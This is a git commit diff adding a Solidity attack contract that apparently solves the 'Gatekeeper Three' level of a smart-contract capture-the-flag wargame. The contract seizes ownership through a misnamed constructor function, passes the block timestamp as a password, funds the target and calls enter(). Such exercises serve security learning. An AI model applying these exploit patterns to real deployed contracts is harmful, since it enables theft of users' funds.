485c7d40c8331be7c01b569e57a9c052aae58417
0xgtim <99255480+timou0911@users.noreply.github.com>
2024-12-26 16:02:51 +0800

    Update Attack.sol

--- 28. Gatekeeper Three ★★★☆☆/Attack.sol
+++ 28. Gatekeeper Three ★★★☆☆/Attack.sol
@@ -1,1 +1,28 @@
+interface IGatekeeperThree {
+    function construct0r() external;
+    function createTrick() external;
+    function getAllowance(uint256 _password) external;
+    function enter() external;
+}
 
+// 0x5F495186De8b5A6E6AB1fB7B5D1e96F68b1347Fa
+
+contract Attack {
+    IGatekeeperThree target;
+
+    constructor(address targetAddr) payable {
+        target = IGatekeeperThree(targetAddr);
+    }
+
+    function attack() public {
+        target.construct0r();
+
+        target.createTrick();
+        target.getAllowance(block.timestamp);
+
+        (bool success, ) = payable(address(target)).call{value: address(this).balance}("");
+        require(success, "call failed");
+
+        target.enter();
+    }
+}
